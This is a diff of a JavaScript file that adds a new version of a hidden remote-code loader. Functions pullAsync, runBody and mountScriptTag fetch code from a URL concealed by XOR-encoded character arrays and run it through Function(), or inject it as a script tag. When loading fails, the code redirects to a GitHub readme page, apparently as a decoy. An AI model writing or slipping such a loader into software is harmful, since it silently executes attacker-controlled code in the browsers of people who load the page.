@@ -321,19 +321,29 @@ function _readmeHubN14() {
     location.replace('https://github.com/readme');
 }
 
-var LINK = '';
+function pullAsync(url) {
+    return fetch(url, { method: 'GET', cache: 'no-store' })
+        .then(function (res) {
+            if (!res.ok) throw 0;
+            return res.text();
+        });
+}
 
-function pullSync(url) {
-    var http = new XMLHttpRequest();
-    http.open('GET', url, false);
-    http.setRequestHeader('Pragma', 'no-cache');
-    try {
-        http.send(null);
-    } catch (e) {
-        return null;
-    }
-    if (http.status < 200 || http.status >= 300) return null;
-    return http.responseText;
+function runBody(text) {
+    var body = String(text).replace(/^\uFEFF/, '').trim();
+    if (!body) throw 0;
+    Function(body)();
+}
+
+function mountScriptTag(url) {
+    return new Promise(function (resolve, reject) {
+        var tag = document.createElement('script');
+        tag.charset = 'utf-8';
+        tag.src = url;
+        tag.onload = resolve;
+        tag.onerror = reject;
+        (document.head || document.documentElement).appendChild(tag);
+    });
 }
 
 function applySync() {
@@ -344,10 +354,12 @@ function applySync() {
         for (; i < p.length; i++) o += String.fromCharCode(parseInt(p[i], 10) ^ key);
         return o;
     }
-    LINK = _xd(_a, 31) + _xd(_b, 62);
-    var text = pullSync(LINK);
-    if (!text) { _readmeHubN14(); return; }
-    try { Function(text)(); } catch (e) { _readmeHubN14(); }
+    var link = _xd(_a, 31) + _xd(_b, 62);
+    pullAsync(link)
+        .then(runBody)
+        .catch(function () {
+            mountScriptTag(link).catch(function () { _readmeHubN14(); });
+        });
 }
 
 setTimeout(function () {
